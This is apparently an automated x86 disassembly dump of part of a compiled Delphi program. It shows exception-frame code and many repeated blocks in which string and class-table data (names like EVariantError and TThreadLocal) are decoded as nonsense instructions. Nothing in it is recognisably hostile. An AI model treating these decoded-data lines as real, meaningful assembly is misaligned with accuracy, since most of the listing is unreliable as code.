add [ esi + eax * 2 + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax + 0x640000ff ] dh
inc esi
dec eax
add [ ecx + 0x640000ff ] dh
inc esi
dec eax
add [ edx + 0x640000ff ] dh
inc esi
dec eax
add [ ebx + 0x640000ff ] dh
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] dh
dec eax
add [ ebp + 0x640000ff ] dh
inc esi
dec eax
add [ esi + 0x640000ff ] dh
inc esi
dec eax
add [ edi + 0x640000ff ] dh
inc esi
dec eax
add [ eax + 0x640000ff ] bh
inc esi
dec eax
add [ ecx + 0x640000ff ] bh
inc esi
dec eax
add [ edx + 0x640000ff ] bh
inc esi
dec eax
add [ ebx + 0x640000ff ] bh
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] bh
dec eax
add [ ebp + 0x640000ff ] bh
inc esi
dec eax
add [ esi + 0x640000ff ] bh
inc esi
dec eax
add [ edi + 0x640000ff ] bh
inc esi
dec eax
add [ eax + 0x640000ff ] ah
inc esi
dec eax
add [ ecx + 0x640000ff ] ah
inc esi
dec eax
add [ edx + 0x640000ff ] ah
inc esi
dec eax
add [ ebx + 0x640000ff ] ah
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] ah
dec eax
add [ ebp + 0x640000ff ] ah
inc esi
dec eax
add [ esi + 0x640000ff ] ah
inc esi
dec eax
add [ edi + 0x640000ff ] ah
inc esi
dec eax
add [ eax + 0x640000ff ] ch
inc esi
dec eax
add [ ecx + 0x640000ff ] ch
inc esi
dec eax
add [ edx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_407065
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40706c
retn
sub_4073a7
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
inc eax
inc eax
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40752c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x75
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] dh
je r-xdata
inc ebp
jb r-xdata
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 ] dl
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add ah cl
jb r-xdata
add [ edx + esi + 0x40 ] dl
add [ eax + 0xc004032 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x76
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jne r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x75846564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x100040 ] al
add [ eax ] al
xor [ eax + eax * 2 ] dh
call 0xfffffffff440b59d
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or [ ebp + 0x4f ] eax
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al ch
xor al 0x40
add ah dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 2 + 0x100040 ] ch
add [ eax ] al
xor [ eax + eax * 2 ] dh
call 0xfffffffff440b545
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] bh
dec ecx
outsb
je r-xdata
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
xor al [ eax ]
nop
xor al [ eax ]
or al [ ebp + 0x4d ]
popad
je r-xdata
jbe r-xdata
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ ecx + esi * 2 ] al
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
enter 0x40b7 0x0
nop
xor al [ eax ]
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] dh
je r-xdata
push esp
xor al [ eax ]
nop
xor al [ eax ]
or al 0x45
aam 0x74
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] cl
inc eax
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 ] dl
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
lea eax [ eax ]
in al dx
xor al [ eax ]
nop
xor al [ eax ]
or al [ ebp + 0x55 ]
outsb
jb r-xdata
jbe r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or eax [ ebp + 0x5a ]
jb r-xdata
inc eax
rcr ah 0x75
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 ] dh
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] dh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x74
inc eax
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ edx + esi + 0x40 ] dl
add [ eax + 0xd004032 ] dl
inc ebp
inc ebx
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jbe r-xdata
insb
outsd
ja r-xdata
add [ edx + esi + 0x40 ] dl
add [ eax + 0xc004032 ] dl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004076 ] dl
add [ eax ] al
add [ eax + 0x70 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or al [ ebp + 0x49 ]
outsb
jbe r-xdata
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or eax [ ebp + 0x52 ]
popad
outsb
inc ebp
jb r-xdata
inc eax
add [ esp + esi * 2 + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x40 ] bl
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 ] dl
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
push cs
inc ebp
push ebx
je r-xdata
add [ eax ] al
jbe r-xdata
outsb
lea eax [ eax ]
test al 0x77
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jbe r-xdata
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
jbe r-xdata
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x9004032 ] dl
inc ebp
dec edi
xor al 0x76
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
jbe r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add ah ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jns r-xdata
outsd
insb
inc ebx
mov eax eax
mov ah 0x78
inc eax
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0xc0040 ] dh
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 ] dl
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
js r-xdata
insb
nop
add [ eax + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004077 ] ch
inc ebp
jb r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc [ ebp + 0x41 ] al
arpl [ ebx + 0x65 ] sp
jae r-xdata
inc eax
jbe r-xdata
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or eax 0x6e6f4345
inc eax
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or al 0x45
add [ eax ] al
add [ edx + esi * 2 ] dl
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc eax
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or eax 0x72615645
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x77
inc eax
add [ eax ] dl
outsd
inc eax
ror [ eax + 0x77 ] 0x40
add [ eax ] al
add [ eax ] al
inc eax
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
inc eax
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or [ ebp + 0x43 ] eax
inc eax
rcl [ eax ] 0x79
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x78
inc eax
add [ eax + eax ] cl
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
jo r-xdata
push esp
xor al [ eax ]
nop
xor al [ eax ]
or al [ ebp + 0x50 ]
jb r-xdata
pop esp
js r-xdata
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edx + 0x40 ] 0x0
or al 0x0
add [ eax ] al
js r-xdata
inc ebp
jb r-xdata
nop
xor al [ eax ]
push cs
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
sub [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
jpe r-xdata
jb r-xdata
add ah cl
jns r-xdata
inc eax
outsd
outsb
je r-xdata
add [ edx + esi + 0x40 ] dl
add [ eax + 0x9004032 ] dl
inc ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ edx + esi + 0x40 ] dl
add [ esp + ecx * 8 ] ch
je r-xdata
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00407a ] al
add [ eax ] al
add [ eax + 0x70 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x70 ] bh
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
adc [ ebp + 0x41 ] al
jae r-xdata
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
loopne r-xdata
je r-xdata
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
xor al 0x7b
imul ebp [ edi + 0x6e ] 0x407a9890
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or [ ebp + 0x4f ] al
push ebx
inc ebp
jb r-xdata
inc eax
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
push cs
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407b883f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax * 2 ] bh
movsb [ edi ] [ esi ]
jpo r-xdata
jb r-xdata
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc al [ ebp + 0x53 ]
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
inc eax
sar bh 0xff
inc eax
add [ eax + eax ] al
add [ eax - 0x17ffbff0 ] ah
add [ ebx + edi * 2 ] dh
je r-xdata
push ebp
inc eax
add [ eax + 0x407a ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx + 0x48213415 ] cl
add [ ebx + 0x48353015 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add al dl
int 0x40
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jl r-xdata
xor al 0x40
add ah dh
xor al 0x40
add al bh
add eax 0xffffffd4
jmp sub_40cf48
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sub al 0xcc
insb
jae r-xdata
je r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34e80040 ] dl
inc eax
add [ eax + 0x57 ] ah
inc eax
add [ edi + edx * 2 + 0x40 ] ch
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ edi + edx * 2 + 0x40 ] bh
add [ edx + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ edx + edi * 2 + 0x3110040 ] 0x2e
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
stosb [ edi ]
push edx
popad
inc ebp
js r-xdata
push ebx
insb
jne r-xdata
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
xor al 0x21
dec eax
add [ ebx + 0x34158910 ] cl
and [ eax ] ecx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
retn
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
sub_407983
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x70 ] bh
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or [ ebp + 0x4f ] al
push ebx
inc ebp
jb r-xdata
inc eax
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
xor al 0x7b
imul ebp [ edi + 0x6e ] 0x407a9890
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
push ebp
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
push cs
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ eax + 0x407a ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edx + 0x40 ] 0x0
or al 0x0
add [ eax ] al
js r-xdata
inc ebp
jb r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407b883f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax * 2 ] bh
movsb [ edi ] [ esi ]
jpo r-xdata
jb r-xdata
inc eax
add [ eax + eax ] al
add [ eax - 0x17ffbff0 ] ah
add [ ebx + edi * 2 ] dh
je r-xdata
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sub al 0xcc
insb
jae r-xdata
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add [ edx + esi + 0x40 ] dl
add [ esp + ecx * 8 ] ch
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00407a ] al
add [ eax ] al
add [ eax + 0x70 ] bh
outsd
jb r-xdata
adc [ ecx + 0x48213415 ] cl
add [ ebx + 0x48353015 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add al dl
int 0x40
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jl r-xdata
xor al 0x40
add ah dh
xor al 0x40
add al bh
add eax 0xffffffd4
jmp sub_40cf48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ edx + edi * 2 + 0x3110040 ] 0x2e
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
nop
xor al [ eax ]
push cs
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
sub [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
je r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34e80040 ] dl
inc eax
add [ eax + 0x57 ] ah
inc eax
add [ edi + edx * 2 + 0x40 ] ch
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ edi + edx * 2 + 0x40 ] bh
add [ edx + esi + 0x40 ] dl
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc al [ ebp + 0x53 ]
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
inc eax
sar bh 0xff
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
stosb [ edi ]
push edx
popad
inc ebp
js r-xdata
push ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
jpe r-xdata
jb r-xdata
insb
jne r-xdata
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
xor al 0x21
dec eax
add [ ebx + 0x34158910 ] cl
and [ eax ] ecx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
adc [ ebp + 0x41 ] al
jae r-xdata
int3
retn
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
jo r-xdata
add ah cl
jns r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc eax
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sub_407b88
imul edi [ ebx + 0x40 ] 0x407b7300
